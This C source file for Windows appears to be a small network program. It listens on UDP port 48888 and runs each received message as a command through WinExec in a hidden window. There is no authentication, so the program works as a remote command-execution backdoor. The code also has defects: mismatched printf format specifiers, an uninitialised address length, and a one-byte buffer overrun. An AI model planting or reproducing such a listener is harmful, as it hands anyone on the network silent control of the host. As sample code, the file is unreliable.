#include <stdio.h>
#include <winsock2.h>
#include "../common/initsock.h"

#include <Windows.h>

#define BUFFER_SIZE 2028
#define PORT 48888
char buff[BUFFER_SIZE];

int start_server() {
    /* UDP socket */
    SOCKET s;
    if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == INVALID_SOCKET) {
        printf("socket() failed: %s\n", GetLastError());
        return -1;
    }

    /* Get local host & bind it to socket descriptor */
    char hostname[56];
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
        printf("gethostname() failed: %s\n", GetLastError());
        return -1;
    }
    struct hostent *pHost;
    if ((pHost = gethostbyname(hostname)) == NULL) {
        printf("gethostbyname() failed: %s\n", GetLastError());
        return -1;
    }

    SOCKADDR_IN local_addr;
    local_addr.sin_family = AF_INET;
    local_addr.sin_port = htons(PORT);
    //local_addr.sin_addr.s_addr = htonl(ADDR_ANY);
    memcpy(&local_addr.sin_addr.S_un.S_addr, pHost->h_addr_list[0], pHost->h_length);

    if (bind(s, (PSOCKADDR) &local_addr, sizeof(SOCKADDR)) == SOCKET_ERROR) {
        printf("bind() failed: %s\n", GetLastError());
        return -1;
    }

    printf("Listening on %s:%d...\n", inet_ntoa(local_addr.sin_addr), 48888);

    SOCKADDR source_addr;
    int from_len;
    while (TRUE) {
        int len = recvfrom(s, buff, BUFFER_SIZE, 0, (PSOCKADDR) &source_addr, &from_len);
        if (len > 0) {
            buff[len] = 0;
            printf("execute command [%s]\n", buff);

            int ret = WinExec(buff, SW_HIDE);
            if (ret > 31) {
                printf("succeed\n");
            } else {
                printf("failed\n");
            }
        }
    }

    // never return
}

int main() {
    InitWinsock();

    int ret = start_server();
    printf("start_server() failed.\n");

    CleanupWinsock();
    return 0;
}
